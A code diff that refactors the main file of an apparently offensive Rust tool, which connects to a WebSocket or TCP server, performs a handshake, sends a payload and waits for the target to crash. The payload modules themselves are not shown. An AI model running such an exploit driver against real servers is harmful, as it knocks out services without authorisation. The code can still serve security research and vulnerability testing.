@@ -1,7 +1,10 @@
-use std::{io::Read, net::TcpStream, process::exit, thread::sleep, time::Duration};
-
+use crate::handshake::Handshake;
+use clap::Parser;
+use config::Args;
+use exploit::implementation::*;
 use log::{error, info};
-
+use payload::Payload;
+use std::{io::Read, net::TcpStream, process::exit, thread::sleep, time::Duration};
 use tungstenite::{connect, stream::MaybeTlsStream};
 
 mod config;
@@ -10,23 +13,24 @@ mod frame;
 mod handshake;
 mod payload;
 
-use config::Args;
-
-use clap::Parser;
-
-use crate::handshake::Handshake;
-use payload::Payload;
-
+/// Get the socket address from the command line arguments
+/// the formats are different on tungstenite and native TCP stream
+///
 fn get_socket_addr() -> String {
     let args = Args::parse();
 
-    if args.use_tungstenite {
-        format!("{}://{}:{}", args.protocol, args.address, args.port)
-    } else {
-        format!("{}:{}", args.address, args.port)
+    if args.server.use_tungstenite {
+        return format!(
+            "{}://{}:{}",
+            args.server.protocol, args.server.address, args.server.port
+        );
     }
+
+    format!("{}:{}", args.server.address, args.server.port)
 }
 
+/// Get the socket stream for tungstenite
+///
 fn get_stream_tungstenite() -> MaybeTlsStream<TcpStream> {
     let socket_addr = get_socket_addr();
 
@@ -41,6 +45,8 @@ fn get_stream_tungstenite() -> MaybeTlsStream<TcpStream> {
     socket.into_inner()
 }
 
+/// Get the socket stream for native TCP stream
+///
 fn get_stream() -> Box<TcpStream> {
     let socket_addr = get_socket_addr();
 
@@ -53,6 +59,41 @@ fn get_stream() -> Box<TcpStream> {
     }))
 }
 
+/// Makes a tungstenite socket and
+/// executes the exploit with it
+///
+fn make_tungstenite_exploit() {
+    let stream = get_stream_tungstenite();
+
+    match stream {
+        MaybeTlsStream::NativeTls(mut stream) => {
+            let mutable = stream.get_mut();
+
+            execute!(mutable);
+        }
+        MaybeTlsStream::Plain(stream) => {
+            execute!(stream);
+        }
+        _ => unreachable!(),
+    }
+}
+
+/// Makes a native TCP stream and
+/// executes the exploit with it
+///
+fn make_native_tcp_stream_exploit() {
+    let stream = get_stream();
+
+    info!("Connected! Passing away the socket");
+
+    disable_nagle!(stream.try_clone().unwrap());
+    increase_write_timeout!(stream.try_clone().unwrap());
+    perform_handshake!(stream.try_clone().unwrap());
+    wait_confirm!(stream.try_clone().unwrap());
+    send_payload!(stream.try_clone().unwrap());
+    wait_for_crash!(stream);
+}
+
 fn main() {
     unsafe {
         std::env::set_var("RUST_LOG", "info");
@@ -62,34 +103,9 @@ fn main() {
 
     let args = Args::parse();
 
-    if args.use_tungstenite {
-        let stream = get_stream_tungstenite();
-
-        match stream {
-            MaybeTlsStream::NativeTls(mut stream) => {
-                /*
-                 * Options are already set
-                 */
-
-                let mutable = stream.get_mut();
-
-                exploit::implementation::execute!(mutable);
-            }
-            MaybeTlsStream::Plain(stream) => {
-                exploit::implementation::execute!(stream);
-            }
-            _ => unreachable!(),
-        }
+    if args.server.use_tungstenite {
+        make_tungstenite_exploit();
     } else {
-        let stream = get_stream();
-
-        info!("Connected! Passing away the socket (lmao what)");
-
-        exploit::implementation::disable_nagle!(stream.try_clone().unwrap());
-        exploit::implementation::increase_write_timeout!(stream.try_clone().unwrap());
-        exploit::implementation::perform_handshake!(stream.try_clone().unwrap());
-        exploit::implementation::wait_confirm!(stream.try_clone().unwrap());
-        exploit::implementation::send_payload!(stream.try_clone().unwrap());
-        exploit::implementation::wait_for_crash!(stream);
+        make_native_tcp_stream_exploit();
     }
 }
